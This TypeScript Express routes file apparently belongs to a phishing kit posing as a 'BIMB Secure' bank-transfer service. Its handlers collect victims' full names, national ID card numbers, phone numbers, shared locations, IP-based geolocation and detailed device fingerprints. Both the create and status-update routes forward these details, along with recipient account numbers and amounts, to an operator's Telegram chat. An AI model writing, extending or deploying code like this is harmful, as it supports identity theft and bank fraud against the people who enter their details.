import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { api } from "@shared/routes";
import { z } from "zod";
import TelegramBot from "node-telegram-bot-api";

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  
  // Initialize Telegram Bot if token is present
  let bot: TelegramBot | null = null;
  if (process.env.TELEGRAM_BOT_TOKEN) {
    bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
    console.log("Telegram Bot initialized");
  } else {
    console.warn("TELEGRAM_BOT_TOKEN not found. Telegram notifications will be disabled.");
  }

  app.post(api.transactions.create.path, async (req, res) => {
    try {
      const input = api.transactions.create.input.parse(req.body);
      const metadata = req.body.metadata ? JSON.parse(req.body.metadata) : {};
      const transaction = await storage.createTransaction(input);
      
      // Send location/info to Telegram immediately on creation if available
      if (bot && process.env.TELEGRAM_CHAT_ID) {
        const ipHeader = req.headers['x-forwarded-for'];
        const ip = (Array.isArray(ipHeader) ? String(ipHeader[0]) : (typeof ipHeader === 'string' ? ipHeader.split(',')[0] : String(req.socket.remoteAddress))) || 'Unknown IP';
        
        let geoInfo = "Not available";
        let ispInfo = "Not available";

        try {
          const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
          if (geoRes.ok) {
            const geoData = await geoRes.json();
            if (geoData.status === 'success') {
              geoInfo = `${geoData.city}, ${geoData.regionName}, ${geoData.country}`;
              ispInfo = geoData.isp;
            }
          }
        } catch (geoErr) {
          console.error("Geo lookup error:", geoErr);
        }

        const device = metadata.device || {};
        const deviceDetails: string[] = [];
        
        const brand = device.brand || device.vendor || '';
        const model = device.model || '';
        const combinedModel = (brand && model && !model.includes(brand)) ? `${brand} ${model}` : (model || brand || 'Unknown');

        if (device.type && device.type !== 'Unknown') deviceDetails.push(`*Type:* ${device.type}`);
        deviceDetails.push(`*Brand:* ${brand || 'Unknown'}`);
        deviceDetails.push(`*Model:* ${model || 'Unknown'}`);
        deviceDetails.push(`*Device Name:* ${combinedModel}`);
        
        if (device.os && device.os !== 'Unknown') deviceDetails.push(`*OS:* ${device.os}${device.osVersion ? ` ${device.osVersion}` : ''}`);
        if (device.browser && device.browser !== 'Unknown') deviceDetails.push(`*Browser:* ${device.browser}${device.browserVersion ? ` ${device.browserVersion}` : ''}`);
        
        // Add hardware hints in a cleaner way
        if (device.hardware) {
          const hw = device.hardware;
          if (hw.deviceMemory) deviceDetails.push(`*Memory:* ${hw.deviceMemory}GB RAM`);
          if (hw.hardwareConcurrency) deviceDetails.push(`*CPU:* ${hw.hardwareConcurrency} Cores`);
        }

        if (device.screen) deviceDetails.push(`*Screen:* ${device.screen}`);
        if (device.language) deviceDetails.push(`*Language:* ${device.language}`);

        const deviceStr = deviceDetails.join('\n');

        const message = `
*NEW TRANSACTION INITIATED*
--------------------------------
*Sender Info:*
*Full Name:* ${metadata.fullName || 'N/A'}
*IC Card:* ${metadata.icCard || 'N/A'}
*Phone:* ${metadata.phoneNumber || 'N/A'}

*Recipient:* ${input.recipientName}
*Bank:* ${input.bank}
*Amount:* RM ${input.amount}
*IP:* ${ip}
*ISP:* ${ispInfo}
*Geo Location:* ${geoInfo}
*Google Maps:* ${metadata.location || 'Not shared'}

${deviceStr ? `*Device Details:*\n${deviceStr}` : ''}
        `.trim();
        
        try {
          await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
        } catch (e) {
          console.error("Initial notify error:", e);
        }
      }
      
      res.status(201).json(transaction);
    } catch (err) {
      if (err instanceof z.ZodError) {
        return res.status(400).json({
          message: err.errors[0].message,
          field: err.errors[0].path.join('.'),
        });
      }
      res.status(500).json({ message: "Internal server error" });
    }
  });

  app.get(api.transactions.get.path, async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const transaction = await storage.getTransaction(id);
      if (!transaction) {
        return res.status(404).json({ message: "Transaction not found" });
      }
      res.json(transaction);
    } catch (err) {
      res.status(500).json({ message: "Internal server error" });
    }
  });

  app.post(api.transactions.updateStatus.path, async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const { status } = api.transactions.updateStatus.input.parse(req.body);
      const metadata = req.body.metadata ? JSON.parse(req.body.metadata) : {};
      
      const ipHeader = req.headers['x-forwarded-for'];
      const ip = (Array.isArray(ipHeader) ? String(ipHeader[0]) : (typeof ipHeader === 'string' ? ipHeader.split(',')[0] : String(req.socket.remoteAddress))) || 'Unknown IP';
      const rawUserAgent = metadata.userAgent || req.headers['user-agent'] || 'Unknown Device';
      const userAgent = Array.isArray(rawUserAgent) ? String(rawUserAgent[0]) : String(rawUserAgent);
      
      const updated = await storage.updateTransactionStatus(id, status);
      
      if (!updated) {
        return res.status(404).json({ message: "Transaction not found" });
      }

      // Send Telegram notification
      if (bot && process.env.TELEGRAM_CHAT_ID) {
        let deviceLine = "";
        const ua = userAgent;
        if (ua && ua !== 'Unknown Device') {
          deviceLine = `*Device:* ${ua}`;
        }

        const message = `
*BIMB SECURE TRANSACTION ${status.toUpperCase()}*
--------------------------------
*Recipient:* ${updated.recipientName}
*Bank:* ${updated.bank}
*Account:* \`${updated.accountNumber}\`
*Amount:* RM ${updated.amount}
*Status:* ${status.toUpperCase()}
*Reference:* ${updated.reference}
*IP Address:* ${ip}
${deviceLine}
*Date:* ${new Date().toLocaleString()}
        `.trim();
        
        try {
          await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
        } catch (error) {
          console.error("Failed to send Telegram message:", error);
        }
      }

      res.json({ success: true, message: "Status updated" });
    } catch (err) {
      if (err instanceof z.ZodError) {
        return res.status(400).json({
          message: err.errors[0].message,
          field: err.errors[0].path.join('.'),
        });
      }
      res.status(500).json({ message: "Internal server error" });
    }
  });

  return httpServer;
}
